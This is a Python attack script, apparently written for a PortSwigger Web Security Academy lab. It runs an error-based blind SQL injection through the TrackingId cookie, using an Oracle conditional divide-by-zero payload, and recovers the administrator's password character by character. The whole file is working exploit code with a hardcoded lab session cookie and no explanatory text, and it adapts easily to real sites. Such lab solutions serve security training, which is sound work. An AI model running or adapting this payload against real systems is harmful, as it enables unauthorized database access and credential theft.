#!/usr/bin/env python3
import requests
import string
import urllib3
from requests.exceptions import RequestException

# === CONFIG ===
url = "https://0aec00c7042cd8b3803d21bf009f00d5.web-security-academy.net/"
session_cookie = "b6MhSVbrEfrviiFOOOYTjbr2RyTZqbUu"                         
pw_length = 20
charset = string.ascii_lowercase + string.digits


cookie_template = (
    "Q'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()

def build_cookie_header(pos, ch):
    raw = cookie_template.format(pos=pos, ch=ch)
    return f"TrackingId={raw}; session={session_cookie}"

def send(cookie_header):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Referer": "https://portswigger.net/",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": cookie_header
    }

    return  session.get(url, headers=headers).status_code


def main():
    found = ""
    for pos in range(1, pw_length + 1):
        print(f"\n[*] Position {pos} — trying charset ({len(charset)} chars)")
        pos_found = False
        for ch in charset:
            cookie_header = build_cookie_header(pos, ch)
            # quick probe first (single try)
            try:
                sc = send(cookie_header)
            except RequestException as e:
                print(f"  ! network error for {ch!r}: {e}")
                continue
            if sc != 200:
                confirmed = True
                if confirmed:
                    found += ch
                    pos_found = True
                    print(f"[+] Found pos {pos} = {ch!r}")
                    print(f"    Current password: {found}")
                    break

        if not pos_found:
            print(f"[-] No confirmed char for position {pos}")
            found += "?"
    print("\n[RESULT] Discovered (partial) password:", found)

if __name__ == "__main__":
    main()
